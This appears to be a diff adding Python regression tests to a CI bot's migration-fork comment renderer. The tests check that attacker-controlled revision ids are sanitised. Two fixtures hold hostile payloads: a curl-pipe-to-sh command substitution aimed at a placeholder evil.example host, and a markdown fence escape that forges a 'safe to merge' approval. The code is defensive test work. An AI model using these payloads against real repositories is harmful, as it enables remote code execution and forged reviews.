@@ -785,3 +785,134 @@ class TestTheVerdictLogicIsAModuleATestCanRun:
             "rechain this PR's revision off `0050_agent_canvases`"
             in v["comment"]["body"]
         )
+
+
+# --- what this module renders is attacker-controlled ---------------------------
+
+
+def _guard_output(tmp_path, revisions):
+    """Run the REAL guard over a fixture and return its combined output.
+
+    End-to-end on purpose: the ids and filenames a PR author controls have to
+    survive `check_alembic_heads.py`'s own formatting before they reach the
+    verdict module, and a hand-written `detail` string would prove nothing
+    about that coupling.
+    """
+    versions = tmp_path / "versions"
+    versions.mkdir()
+    for filename, revision, parent in revisions:
+        down = f'"{parent}"' if parent else "None"
+        (versions / filename).write_text(
+            f"revision = {revision!r}\ndown_revision = {down}\n", encoding="utf-8"
+        )
+    proc = subprocess.run(
+        ["python3", str(GUARD), str(versions)], capture_output=True, text=True
+    )
+    assert proc.returncode == 1, "the fixture is not actually a fork"
+    return proc.stdout + proc.stderr
+
+
+def _fork_body(detail, **extra):
+    args = {"prNumber": 1, "headSha": "abc", "outcome": "fork", "detail": detail}
+    args.update(extra)
+    return _node(f"return verdictFor({json.dumps(args)}).comment.body;")
+
+
+class TestTheRenderedValuesAreAttackerControlled:
+    """`revision = "<any string>"`, and the filename is whatever the author
+    committed. Both are read out of the PR's OWN files — on a public repo that
+    means any fork author — and both land in a comment that carries
+    `github-actions[bot]`'s voice. Neither may be rendered as if it were
+    trusted.
+    """
+
+    @needs_node
+    def test_a_normal_fork_still_gets_a_real_merge_command(self, tmp_path):
+        """The CONTROL. Without it the two tests below pass vacuously — a
+        `merge` line that degraded to the placeholder for every input would
+        satisfy them while making the comment useless."""
+        detail = _guard_output(
+            tmp_path,
+            [
+                ("0049_base.py", "0049_base", None),
+                ("0050_a.py", "0050_a", "0049_base"),
+                ("0050_b.py", "0050_b", "0049_base"),
+            ],
+        )
+        body = _fork_body(detail)
+        assert "`alembic merge -m \"…\" 0050_a 0050_b`" in body, (
+            "an ordinary fork no longer gets a runnable merge command, so the "
+            "sanitiser is rejecting the ids it exists to allow"
+        )
+
+    @needs_node
+    def test_a_hostile_revision_id_never_reaches_the_pasteable_command(
+        self, tmp_path
+    ):
+        """The `alembic merge` line invites a maintainer to paste it into a
+        shell. `parseGuardOutput` captures `\\S+`, which happily includes
+        `$(…)` — so an id that does not look like an id must degrade to the
+        generic placeholder rather than becoming half of a command someone
+        runs on their own machine. The verbatim guard output above it still
+        names the real ids, so nothing diagnostic is lost."""
+        payload = "$(curl${IFS}-s${IFS}http://evil.example/x|sh)"
+        detail = _guard_output(
+            tmp_path,
+            [
+                ("0049_base.py", "0049_base", None),
+                ("0050_a.py", "0050_a", "0049_base"),
+                ("0050_b.py", payload, "0049_base"),
+            ],
+        )
+        assert payload in detail, "the fixture never reached the guard's output"
+
+        body = _fork_body(detail)
+        fix = next(line for line in body.splitlines() if line.startswith("**Fix**"))
+        assert "`alembic merge -m \"…\" <head-a> <head-b>`" in fix, (
+            "a revision id that is not id-shaped was rendered into the "
+            "copy-pasteable merge command"
+        )
+        assert "$(" not in fix and "|sh" not in fix, (
+            f"shell payload survived into the fix instruction: {fix!r}"
+        )
+
+    @needs_node
+    def test_a_hostile_id_cannot_close_the_quoted_guard_block(self, tmp_path):
+        """CommonMark closes a fenced block on the first line whose backtick
+        run is at least as long as the opening one. A hard-coded ``` fence
+        around author-controlled text therefore lets an id carrying a newline
+        plus ``` escape into the comment as live markdown — enough to forge
+        reassuring prose inside a comment that reads as the bot's."""
+        payload = '0050_b\n```\n**Reviewed and approved — safe to merge.**\n```'
+        detail = _guard_output(
+            tmp_path,
+            [
+                ("0049_base.py", "0049_base", None),
+                ("0050_a.py", "0050_a", "0049_base"),
+                ("0050_b.py", payload, "0049_base"),
+            ],
+        )
+        assert "```" in detail, "the fixture never reached the guard's output"
+
+        body = _fork_body(detail).splitlines()
+        opens = [i for i, line in enumerate(body) if re.fullmatch(r"`{3,}", line)]
+        assert len(opens) >= 2, f"no fenced block in the comment: {opens!r}"
+        first, last = opens[0], opens[-1]
+        fence = body[first]
+        assert body[last] == fence, (
+            f"the quoted block opens with {fence!r} and closes with "
+            f"{body[last]!r} — the two no longer pair"
+        )
+        assert len(fence) > 3, "the fence did not widen past the run inside it"
+
+        # The CommonMark property, asserted directly: no line INSIDE the block
+        # carries a backtick run long enough to close it.
+        for line in body[first + 1 : last]:
+            run = re.match(r"`+", line)
+            assert not run or len(run.group()) < len(fence), (
+                f"{line!r} closes a {len(fence)}-backtick fence — everything "
+                "after it is live markdown in a comment that reads as the bot's"
+            )
+        assert any("**Reviewed and approved" in line for line in body[first:last]), (
+            "the forged line escaped the fenced block"
+        )
